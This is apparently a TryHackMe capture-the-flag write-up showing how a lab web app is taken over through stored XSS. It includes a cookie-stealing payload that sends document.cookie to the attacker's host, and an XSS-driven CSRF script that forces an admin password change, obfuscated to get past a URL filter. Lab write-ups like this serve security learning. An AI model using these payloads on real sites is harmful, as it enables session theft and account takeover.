---
title: "Whats Your Name?"
date: 2026-05-26
categories: ["TryHackMe", "Challenge"]
tags: ["tryhackme"]
description: "Utilise your client-side exploitation skills to take control of a web app."
toc: true
comments: false
---

![image-1900](/assets/img/obsidian/whats-your-name/image-1900.png)

# Questions

![image-1901](/assets/img/obsidian/whats-your-name/image-1901.png)

---

# Setup 

add `worldwap.thm` to /etc/hosts

![image-1924](/assets/img/obsidian/whats-your-name/image-1924.png)

---

## Enumeration and Scanning

using `nmap`

![image-1925](/assets/img/obsidian/whats-your-name/image-1925.png)

Only `ssh` and `http` ports were open.

So, let's open the website.

![image-1904](/assets/img/obsidian/whats-your-name/image-1904.png)

**View Source**

![image-1905](/assets/img/obsidian/whats-your-name/image-1905.png)


![image-1913](/assets/img/obsidian/whats-your-name/image-1913.png)

![image-1914](/assets/img/obsidian/whats-your-name/image-1914.png)

If **role = moderator -> admin.php if not -> dashboard.php**


---

## Get Moderator Role

Let's visit the `register` page

![image-1906](/assets/img/obsidian/whats-your-name/image-1906.png)

Let's try injecting `XSS` with a simple payload 

```
<script src="http://MACHINE_IP/test"></script> 
```

to check if we can use the payload in each input field.

![image-1926](/assets/img/obsidian/whats-your-name/image-1926.png)
![image-1918](/assets/img/obsidian/whats-your-name/image-1918.png)


Just change the username to something shorter
![image-1928](/assets/img/obsidian/whats-your-name/image-1928.png)

Now, it succeeds.

Create a php server to check which field is working

`php -S 0.0.0.0:80`

![image-1929](/assets/img/obsidian/whats-your-name/image-1929.png)

It seems like every input field except password can accept an XSS payload. Next, let's steal the moderator's session cookie to access `dashboard.php`

**Payload** : 

```
<script>fetch("http://MACHINE_IP?cookie="+ btoa(document.cookie),{method: "GET"});</script>
```

![image-1931](/assets/img/obsidian/whats-your-name/image-1931.png)

After registering, look at the log, and we will see the session cookie.

![image-1932](/assets/img/obsidian/whats-your-name/image-1932.png)

`UEhQU0VTU0lEPTkwcWlrdmo4Z2ZjaWxqNXNicmZuNmk4Njhx`

Which is encoded with `base64`. Let's decode this.

![image-1933](/assets/img/obsidian/whats-your-name/image-1933.png)

Now, we got the `PHPSESSID` of the **moderator**.

![image-1934](/assets/img/obsidian/whats-your-name/image-1934.png)

Change the value of `PHPSESSID` to the one we got.

![image-1935](/assets/img/obsidian/whats-your-name/image-1935.png)

After reloading `worldwap.thm`, it redirects to `dashboard.php`. There is information about a subdomain `login.worldwap.thm`.

So, let's add this domain name to our `/etc/hosts` first

![image-1936](/assets/img/obsidian/whats-your-name/image-1936.png)

Then visit the website.

![image-1911](/assets/img/obsidian/whats-your-name/image-1911.png)

This is the hint that we have to visit `http://login.worldwap.thm/login.php`

![image-1937](/assets/img/obsidian/whats-your-name/image-1937.png)

With our moderator session, we now access the moderator's `profile.php` and find our first flag.

---

## Get Admin Role

Investigate pages we can access.

Change password:

![image-1938](/assets/img/obsidian/whats-your-name/image-1938.png)

Chat with Admin:

![image-1940](/assets/img/obsidian/whats-your-name/image-1940.png)

This is interesting. Let's try injecting simple XSS to see if it works or not.

```
<script>alert(1)</script>
```

![image-1942](/assets/img/obsidian/whats-your-name/image-1942.png)

**XSS** worked!

So, let's inspect the page further and we don't see any **CSRF** protection like **CSRF** tokens.

Let's craft a script to inject **XSS** to send a request to change the password with our new_password = `hacked`

```
<script>
    window.onload = function() {
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = 'http://login.worldwap.thm/change_password.php';
        var input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'new_password';
        input.value = 'hacked';
        form.appendChild(input);
        document.body.appendChild(form);
        form.submit();
    };
</script>
```

It seems like it's not working. Click view source to see what happens.

![image-1943](/assets/img/obsidian/whats-your-name/image-1943.png)

 we see that the HTTP URL we submit gets automatically formatted to `<a href...>`.

So, let's modify our payload a little bit to bypass this detection.

```
<script>
    window.onload = function() {
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = 'ht'+'tp://'+'login.worldwap.thm/change_password.php';
        var input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'new_password';
        input.value = 'hacked';
        form.appendChild(input);
        document.body.appendChild(form);
        form.submit();
    };
</script>
```


If it works, we will be redirected to the change password page

![image-1945](/assets/img/obsidian/whats-your-name/image-1945.png)

It worked! Now, let's try logging in with our new password

![image-1946](/assets/img/obsidian/whats-your-name/image-1946.png)

![image-1947](/assets/img/obsidian/whats-your-name/image-1947.png)

Finally, we get access to the **admin** account and get the last flag!

*DONE!!!*

---
